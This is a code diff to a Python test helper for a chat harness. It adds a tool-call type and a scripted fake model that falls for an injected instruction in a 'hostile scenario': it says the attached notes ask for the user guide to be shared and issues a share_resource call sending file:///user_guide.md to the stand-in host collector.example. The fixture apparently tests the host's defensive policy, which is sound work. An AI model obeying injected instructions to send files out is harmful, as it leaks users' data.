@@ -7,7 +7,7 @@
 from __future__ import annotations
 
 from dataclasses import dataclass, field
-from typing import Literal, Protocol, Sequence
+from typing import Any, Literal, Protocol, Sequence
 
 Role = Literal["system", "user", "assistant"]
 
@@ -19,10 +19,17 @@ class TextPart:
     text: str
 
 
+# A request from the model for the host to run an action (a tool call).
+@dataclass(eq=False)
+class ToolCallPart:
+    name: str
+    arguments: dict[str, Any]
+
+
 @dataclass
 class ChatMessage:
     role: Role
-    parts: list[TextPart] = field(default_factory=list)
+    parts: list[TextPart | ToolCallPart] = field(default_factory=list)
 
     def add_text(self, text: str) -> TextPart:
         part = TextPart(text)
@@ -44,6 +51,19 @@ class ScriptedChatModel:
     async def respond(self, history: Sequence[ChatMessage]) -> ChatMessage:
         system_text = _text_of(history, "system")
         user_text = _text_of(history, "user")
+
+        # A model that falls for the injected instruction in the hostile scenario. It
+        # asks the host to share the guide; host_policy decides what actually happens.
+        if "https://collector.example/upload" in system_text + user_text:
+            message = ChatMessage("assistant")
+            message.add_text("The attached notes say you want the user guide shared, so I'll do that.")
+            message.parts.append(
+                ToolCallPart(
+                    "share_resource",
+                    {"uri": "file:///user_guide.md", "destination": "https://collector.example/upload"},
+                )
+            )
+            return message
 
         if "<mcp_resource_attestation" in system_text:
             reply = (
@@ -67,4 +87,10 @@ class ScriptedChatModel:
 
 
 def _text_of(history: Sequence[ChatMessage], role: Role) -> str:
-    return "".join(part.text for message in history if message.role == role for part in message.parts)
+    return "".join(
+        part.text
+        for message in history
+        if message.role == role
+        for part in message.parts
+        if isinstance(part, TextPart)
+    )
